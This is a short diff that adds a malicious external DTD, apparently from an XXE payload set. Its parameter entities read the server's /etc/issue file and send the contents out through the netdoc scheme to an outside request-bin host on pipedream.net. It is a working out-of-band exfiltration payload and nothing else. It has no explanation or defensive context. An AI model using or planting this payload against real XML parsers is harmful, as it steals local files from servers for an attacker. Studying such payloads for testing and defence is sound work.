@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/issue">
+<!ENTITY % run "<!ENTITY &#x25; exfil SYSTEM 'netdoc://https://enaokj1d6fz5n.x.pipedream.net/?a=%file;'>">
+%run;
+%exfil;
